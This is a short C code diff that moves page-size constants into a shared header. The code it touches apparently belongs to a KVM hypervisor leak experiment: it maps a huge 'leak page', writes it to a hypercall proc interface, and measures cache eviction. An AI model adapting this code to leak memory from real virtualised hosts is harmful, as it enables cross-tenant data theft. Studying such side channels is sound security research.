@@ -10,10 +10,9 @@
 #include <time.h>
 #include <unistd.h>
 
+#include "constants.h"
 #include "hypercall.h"
 #include "time_deque.h"
-
-#define LEAK_PAGE_SIZE (2097152) // 2MiB
 
 int hypercall(struct send_ipi_hypercall *opts) {
   const char *hypercall_path = "/proc/hypercall/send_ipi";
@@ -37,7 +36,7 @@ void determine_cache_eviction(void *leak) {
     err(fd, "Failed to open %s", hypercall_path);
   }
 
-  int b = write(fd, leak, LEAK_PAGE_SIZE);
+  int b = write(fd, leak, HUGE_PAGE_SIZE);
   close(fd);
   if (b < 0) {
     err(errno, "Failed to write to %s", hypercall_path);
@@ -82,7 +81,6 @@ typedef char kvm_lapic[8];
 //
 size_t find_min(void *buf) {
   const uint32_t MAX_IDX = 0xffffffff;
-  const int PAGE_SIZE = 4096;
   const int PAGES_IN_BATCH = 256;
   const int ELEMENTS_PER_PAGE = PAGE_SIZE / sizeof(kvm_lapic);
 
@@ -189,7 +187,7 @@ int main(int argc, char *argv[argc]) {
   }
 
   // Spawn the leak page
-  void *leak_page = mmap(NULL, LEAK_PAGE_SIZE, PROT_READ | PROT_WRITE,
+  void *leak_page = mmap(NULL, HUGE_PAGE_SIZE, PROT_READ | PROT_WRITE,
                          MAP_ANONYMOUS | MAP_PRIVATE | MAP_HUGETLB | MAP_POPULATE, 0, 0);
   if (leak_page == (void *)-1) {
     err(errno, "mmap failed");
@@ -210,6 +208,6 @@ int main(int argc, char *argv[argc]) {
     determine_cache_eviction(leak_page);
   }
 
-  munmap(leak_page, LEAK_PAGE_SIZE);
+  munmap(leak_page, HUGE_PAGE_SIZE);
   return 0;
 }
